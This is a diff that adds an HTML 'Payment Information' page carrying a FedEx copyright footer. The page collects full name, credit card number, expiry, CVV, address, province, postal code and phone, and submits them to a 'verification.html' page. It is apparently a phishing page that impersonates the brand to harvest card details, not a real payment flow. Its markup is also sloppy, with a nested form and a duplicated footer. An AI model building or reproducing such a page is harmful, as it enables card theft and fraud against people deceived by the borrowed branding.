@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<title>Payment Information</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<style>
+		.container {
+			animation-name: slideIn;
+			animation-duration: 3s;
+			animation-fill-mode: both;
+		}
+		@keyframes slideIn {
+			from {
+				transform: translateX(-100%);
+			}
+			to {
+				transform: translateX(0);
+			}
+		}
+	</style>
+</head>
+    
+<body>
+	<div class="container">
+		<header>
+		</header>  
+        <main>
+			<h1>Payment Information</h1>
+			<div id="payment-form">
+				<form action="verification.html">
+                    
+<label for="full-name">Full Name:</label>
+<input type="text" id="full-name" name="full-name" required>
+
+<label for="card-number">Credit Card Number:</label>
+<input type="text" id="card-number" name="card-number" required pattern="[0-9]{16}" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 16)">
+
+<label for="card-expiry">Expiration mm/yy:</label>
+<input type="text" id="card-expiry" name="card-expiry" maxlength="4">
+            
+<label for="card-cvv">Security code cvv:</label>
+<input type="text" id="card-cvv" name="card-cvv" required pattern="[0-9]{3,4}" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4)">
+                
+<label for="customer-address">Address:</label>
+<input type="text" id="customer-address" name="customer-address" required>
+
+<label for="customer-city">City:</label>
+<input type="text" id="customer-city" name="customer-city" required>
+
+<label for="Province">Province:</label>
+<input type="text" id="Province" name="Province" onkeypress="return onlyProvince(event)" required>
+
+<script>
+function onlyProvince(event) {
+  var provinces = ["Alberta", "British Columbia", "Manitoba", "New Brunswick", "Newfoundland and Labrador", "Northwest Territories", "Nova Scotia", "Nunavut", "Ontario", "Prince Edward Island", "Quebec", "Saskatchewan", "Yukon"];
+  var char = String.fromCharCode(event.keyCode);
+  var input = document.getElementById("Province").value + char;
+  input = input.toLowerCase().trim();
+  
+  for (var i = 0; i < provinces.length; i++) {
+    if (provinces[i].toLowerCase().startsWith(input)) {
+      return true;
+    }
+  }
+  return false;
+}
+</script>
+
+<label for="postal-code">Postal Code:</label>
+<input type="text" id="postal-code" name="postal-code" maxlength="7" pattern="[A-Za-z]\d[A-Za-z] \d[A-Za-z]\d" oninput="formatPostalCode()" required>
+
+<script>
+function formatPostalCode() {
+  var input = document.getElementById("postal-code");
+  var formatted = input.value.toUpperCase().replace(/[^A-Z0-9]/g, "");
+  if (formatted.length > 3) {
+    formatted = formatted.slice(0, 3) + " " + formatted.slice(3);
+  }
+  input.value = formatted;
+}
+</script>
+
+<label for="customer-phone">Phone Number:</label>
+<input type="tel" id="customer-phone" name="customer-phone" pattern="[0-9]{10}" onkeypress="return onlyNumeric(event)" maxlength="10" required>
+
+<script>
+function onlyNumeric(event) {
+  var charCode = event.which ? event.which : event.keyCode;
+  if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+    return false;
+  }
+  return true;
+}
+</script>
+                
+<form action="verification.html">
+  <input type="submit" value="Pay Now">
+</form>
+
+     </main>
+       <footer class="site-footer">
+    <div class="site-footer__left">
+        <p>&copy; 2023 FedEx. All Rights Reserved.</p>
+        <ul>
+            <footer class="site-footer"> 
+                <p>&copy; 2023 FedEx. All Rights Reserved.</p>
+                <ul>
+                <li><a href="#">Corporate Responsibility</a></li>
+              <li><a href="#">Newsroom</a></li>
+                 <li><a href="#">Contact Us</a></li>
+                    <li><a href="#">Corporate Responsibility</a></li>
+                    <li><a href="#">Newsroom</a></li>
+                    <li><a href="#">Contact Us</a></li>
+            </div>
+</body>
+</html>
